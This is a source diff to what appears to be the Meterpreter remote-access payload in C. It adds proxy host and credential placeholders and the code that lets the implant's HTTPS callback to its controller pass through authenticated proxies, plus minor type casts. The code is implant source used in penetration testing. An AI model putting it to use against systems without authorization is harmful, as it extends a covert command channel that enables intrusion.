@@ -5,6 +5,9 @@
 char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
 char * global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char * global_meterpreter_proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char * global_meterpreter_proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char * global_meterpreter_proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 int global_expiration_timeout = 0xb64be661;
 int global_comm_timeout       = 0xaf79257f;
 
@@ -112,7 +115,7 @@ static VOID server_socket_flush( Remote * remote )
 	fd_set fdread;
 	DWORD ret;
 	SOCKET fd;
-    unsigned char buff[4096];
+    char buff[4096];
 
 	lock_acquire( remote->lock );
 
@@ -129,7 +132,7 @@ static VOID server_socket_flush( Remote * remote )
 		tv.tv_sec  = 1;
 		tv.tv_usec = 0;
 
-		data = select(fd + 1, &fdread, NULL, NULL, &tv);
+		data = select((int)fd + 1, &fdread, NULL, NULL, &tv);
 		if(data == 0)
 			break;
 
@@ -166,7 +169,7 @@ static LONG server_socket_poll( Remote * remote, long timeout )
 	tv.tv_sec  = 0;
 	tv.tv_usec = timeout;
 
-	result = select( fd + 1, &fdread, NULL, NULL, &tv );
+	result = select((int)fd + 1, &fdread, NULL, NULL, &tv );
 
 #ifndef _WIN32 
 	// Handle EAGAIN, etc.
@@ -275,7 +278,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
 		remote->ssl  = SSL_new(remote->ctx);
 		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
 		    
-		if( SSL_set_fd(remote->ssl, remote->fd) == 0 )
+		if( SSL_set_fd(remote->ssl, (int)remote->fd) == 0 )
 		{
 			dprintf("[SERVER] set fd failed");
 			success = FALSE;
@@ -402,8 +405,12 @@ static DWORD server_dispatch_http_wininet( Remote * remote )
 	remote->comm_last_packet = current_unix_timestamp();
 	
 	// Allocate the top-level handle
-	remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	if (!remote->hInternet) {
+	if (!strcmp(global_meterpreter_proxy,"METERPRETER_PROXY")) {
+		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	}
+	else {
+		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PROXY, global_meterpreter_proxy, NULL, 0);
+	}	if (!remote->hInternet) {
 		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
 		return 0;
 	}
@@ -436,6 +443,13 @@ static DWORD server_dispatch_http_wininet( Remote * remote )
 	}
 	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);
 
+	//authentication
+	if (!(strcmp(global_meterpreter_proxy_username, "METERPRETER_USERNAME_PROXY") == 0))
+	{
+		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, global_meterpreter_proxy_username, (DWORD)strlen(global_meterpreter_proxy_username)+1);
+		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, global_meterpreter_proxy_password, (DWORD)strlen(global_meterpreter_proxy_password)+1);
+		dprintf("[DISPATCH] Proxy authentication configured : %s/%s", global_meterpreter_proxy_username, global_meterpreter_proxy_password);
+	}
 
 	// Bring up the scheduler subsystem.
 	result = scheduler_initialize( remote );
